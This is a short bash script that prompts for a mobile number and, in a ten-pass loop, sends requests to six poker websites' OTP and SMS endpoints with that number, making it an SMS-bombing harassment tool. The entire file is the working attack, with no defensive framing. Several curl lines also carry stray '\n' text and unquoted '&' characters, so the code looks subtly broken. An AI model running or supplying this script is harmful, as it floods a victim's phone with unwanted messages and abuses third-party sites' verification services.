#!/bin/bash
echo please enter the mobile number..
read phone
for x in {1..10}
do
curl http://ftrpoker.com/smsc?PHONE=$phone\n
curl http://thespartanpoker.com/smsc?PHONE=$phone\n
curl http://pokersaint.com/SendOTP.asp?For=Phone&PhoneNo=$phone\n
curl http://pokerraj.com/SendOTP.asp?For=Phone&PhoneNo=$phone\n
curl http://chipbazar.com/SendOTP.asp?For=Phone&PhoneNo=$phone\n
curl http://callingstation.in/SendOTP.asp?For=Phone&PhoneNo=$phone\n
done